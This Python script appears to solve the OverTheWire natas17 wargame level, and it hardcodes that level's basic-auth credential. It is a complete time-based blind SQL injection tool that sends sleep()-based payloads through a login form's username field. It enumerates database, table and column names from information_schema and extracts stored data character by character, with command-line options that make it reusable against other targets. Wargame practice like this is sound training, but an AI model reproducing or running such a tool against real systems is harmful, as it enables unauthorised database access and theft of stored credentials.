#!/usr/bin/env python3

import requests
import string
import click

alpha_frequency = "eariotnslcudpmhgbfywkvxzjq"
charset = ",_-" + alpha_frequency + "0123456789" + alpha_frequency.upper()

time = 3

url = "http://natas17.natas.labs.overthewire.org/index.php"
basic = requests.auth.HTTPBasicAuth("natas17","XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")

def teste(res):
    global time
    #print(res.elapsed.total_seconds())
    if res.elapsed.total_seconds() > 10:
        return 1
    else:
        return 0

def discover_databases_names_size():
    global time
    min_len_db = 0
    max_len_db = 1000
    len_db = 0

    while len_db == 0:
        media = (max_len_db + min_len_db) // 2
        payload = '" or (length((select group_concat(schema_name) from information_schema.schemata)) > ' + str( media ) + ' and sleep(' + str(time) + ')) #'
        data = {'username':payload}
        res = requests.post(url,data=data,auth=basic)
        if teste(res):
            min_len_db = ((max_len_db + min_len_db) // 2) - 1
        else:
            max_len_db = ((max_len_db + min_len_db) // 2) + 1
        print("Min: " + str(min_len_db))
        print("Max: " + str(max_len_db))
        print()
        if (max_len_db - min_len_db) < 5:
            for n in range(min_len_db-1,max_len_db+1):
                print("Trying " + str(n) + " ... ")
                payload = '" or (length((select group_concat(schema_name) from information_schema.schemata)) = ' + str( n ) + ' and sleep(' + str(time) +')) #'
                data = {'username':payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res):
                    len_db = n
                    break
    print("Database length: " + str(len_db))
    return len_db

def discover_databases_names(len_db):
    global time
    databases_list = []

    for i in range(len_db):
        databases_list.append(' ')

    for char in charset:
        for index in range(len_db):
            if databases_list[index] == " ":
                payload = '" or (substring((select group_concat(schema_name) from information_schema.schemata),' + str(index+1) + ',1) = "' 
                payload = payload + char + '" and sleep('+str(time)+')) #' 
                data = {'username':payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res):
                    databases_list[index] = char
        print('Database names: ' + ''.join(x for x in databases_list))

    databases_name = ''.join(x for x in databases_list)
    return databases_name

def discover_tables_names_size_from_db(dbname):
    global time 
    min_len_tb = 0
    max_len_tb = 1000
    len_tb = 0
    print("----------------")
    while len_tb == 0:
        print("MAX: " + str(max_len_tb))
        print("MIN: " + str(min_len_tb))
        print("----------------")
        media = ( max_len_tb + min_len_tb ) // 2
        payload = '" or (length((select group_concat(table_name) from information_schema.tables where table_schema="'
        payload = payload + dbname + '")) > ' + str(media) + ' and sleep(' + str(time) + ')) #'
        print(payload)
        data = {'username': payload}
        res = requests.post(url,data=data,auth=basic)
        if teste(res):
            min_len_tb = ( ( max_len_tb + min_len_tb ) // 2 ) - 1
        else:
            max_len_tb = ( ( max_len_tb + min_len_tb ) // 2 ) + 1
        if ( max_len_tb - min_len_tb ) < 10:
            for i in range(min_len_tb-1,max_len_tb+1):
                print("Trying " + str(i) + " ... ")
                payload = '" or (length((select group_concat(table_name) from information_schema.tables where table_schema="' 
                payload = payload + dbname + '" )) = ' + str(i) + ' and sleep(' + str(time) + ')) #'
                print(payload)
                data = {'username': payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res):
                    len_tb = i
                    break
    print("Size of concat tables: " + str(len_tb))
    return len_tb

def discover_tables_names_from_db(len_tb,dbname):
    global time 
    tables_list = []

    for i in range(len_tb):
        tables_list.append(' ')

    for char in charset:
        p = False
        for index in range(len_tb):
            if tables_list[index] == " ":
                payload = '" or (substring((select group_concat(table_name) from information_schema.tables where table_schema="'
                payload = payload +dbname+'"),' + str(index+1) + ',1) = "' + char + '" and sleep(' + str(time) + ')) #'
                data = {'username':payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res):
                    tables_list[index] = char
                    p = True
        if p:
            print('Tables names: ' + ''.join(x for x in tables_list))

    tables_names = ''.join(x for x in tables_list) 
    return tables_names

def discover_columns_names_size_from_tb(dbname,tbname):
    global time
    min_len_cl = 0
    max_len_cl = 1000
    len_cl = 0
    while len_cl == 0:
        print("MAX: " + str(max_len_cl))
        print("MIN: " + str(min_len_cl))
        print("----------------")
        media = ( max_len_cl + min_len_cl ) // 2
        payload = '" or (length((select group_concat(column_name) from information_schema.columns where table_schema="' + dbname 
        payload = payload + '" and table_name="' + tbname + '" )) > ' + str(media) + ' and sleep(' + str(time) + ') ) #'
        data = {'username':payload}
        res = requests.post(url,data=data,auth=basic)
        if teste(res):
            min_len_cl = ( ( max_len_cl + min_len_cl ) // 2 ) - 1
        else:
            max_len_cl = ( ( max_len_cl + min_len_cl ) // 2 ) + 1
        if ( max_len_cl - min_len_cl ) < 10:
            for i in range(min_len_cl-1,max_len_cl+1):
                print("Trying " + str(i) + " ... ")
                payload = '" or (length((select group_concat(column_name) from information_schema.columns where table_schema="' 
                payload = payload + dbname + '" and table_name = "' + tbname + '" )) = ' + str(i) + ' and sleep(' + str(time) + ')) #'
                data = {'username': payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res):
                    len_cl = i
                    break
    print("Size of concat tables: " + str(len_cl))
    return len_cl

def discover_columns_names_from_tb(dbname,tbname,len_cl):
    global time 
    columns_list = []

    for i in range(len_cl):
        columns_list.append(' ')

    for char in charset:
        p = False
        for index in range(len_cl):
            if columns_list[index] == " ":
                payload = '" or (substring((select group_concat(column_name) from information_schema.columns where table_schema="'
                payload = payload + dbname + '" and table_name="' + tbname + '"),' + str(index+1) + ',1) = "' + char + '" and sleep(' + str(time) + ')) #'
                data = {'username':payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res):
                    columns_list[index] = char
                    p = True
        if p:
            print('Tables names: ' + ''.join(x for x in columns_list))

    columns_names = ''.join(x for x in columns_list) 
    return columns_names

def dump_data(clnames,tbname,dbname,size):
    global time 
    global charset
    min_len = 0
    max_len = 1000
    columns = clnames.split(',')
    columns = ',":",'.join(c for c in columns)
    print("----------------")
    while size == 0:
        print("MAX: " + str(max_len))
        print("MIN: " + str(min_len))
        print("----------------")
        media = ( max_len + min_len ) // 2
        payload = '" or (length((select group_concat(' + columns + ') from ' + dbname + '.' 
        payload = payload + tbname + ' where users.username="natas18")) > ' + str(media) + ' and sleep(' + str(time) + ')) #'
        print(payload)
        data = {'username':payload}
        res = requests.post(url,data=data,auth=basic)
        if teste(res):
            min_len = ( ( min_len + max_len ) // 2 ) - 1
        else:
            max_len = ( ( min_len + max_len ) // 2 ) + 1
        if ( max_len - min_len ) < 10:
            for i in range(min_len-1,max_len+1):
                print("Trying size " + str(i))
                print("----------------")
                payload = '" or (length((select group_concat(' + columns + ') from ' +dbname + '.' 
                payload = payload + tbname + ' where users.username="natas18")) = ' + str(i) + ' and sleep(' + str(time) + ')) #'
                data = {'username':payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res):
                    size = i
                    break
    print("Size of data: " + str(size))
    print("----------------")
    charset = ":" + charset
    data_list = []
    for i in range(size):
        data_list.append(' ')

    for char in charset:
        p = False
        print("Trying char " + char)
        for index in range(size):
            if data_list[index] == ' ':
                payload = '" or (BINARY substring((select group_concat(' + columns + ') from ' + dbname 
                payload = payload + '.' + tbname + ' where username="natas18"),' + str(index+1) + ',1) = "' + char + '" and sleep(' + str(time) + ')) #'
                data = {'username':payload}
                res = requests.post(url,data=data,auth=basic)
                if teste(res):
                    print("FOUND! (" + str(index+1) + ")")
                    p = True
                    data_list[index] = char
        if p:
            print("----------------")
            print('Data: ' + ''.join(c for c in data_list))
            print("----------------")
        else:
            print("----------------")
    print('Data: ' + ''.join(c for c in data_list))


@click.command()
@click.option("--dbs",required=False,is_flag=True)
@click.option("--tables",default=False,required=False,is_flag=True)
@click.option("--dbname",default='',required=False, help="Size of databases names")
@click.option("--columns",default=False,required=False,is_flag=True)
@click.option("--tbname",default='',required=False)
@click.option("--dump",default=False,required=False,is_flag=True)
@click.option("--clnames",default='',required=False)
@click.option("--size",default=0,required=False)
@click.option("--cset",default='',required=False)
def main(dbs,dbname,tables,columns,tbname,dump,clnames,size,cset):
    global charset
    if cset != '':
        charset = cset
    if dbs:
        dbsize = discover_databases_names_size()
        print(discover_databases_names(dbsize))
    if tables:
        len_tb = discover_tables_names_size_from_db(dbname)
        print(discover_tables_names_from_db(len_tb,dbname))
    if columns:
        len_cl = discover_columns_names_size_from_tb(dbname,tbname)
        print(discover_columns_names_from_tb(dbname,tbname,len_cl))
    if dump:
        dump_data(clnames,tbname,dbname,size)


if __name__ == "__main__":
    main()


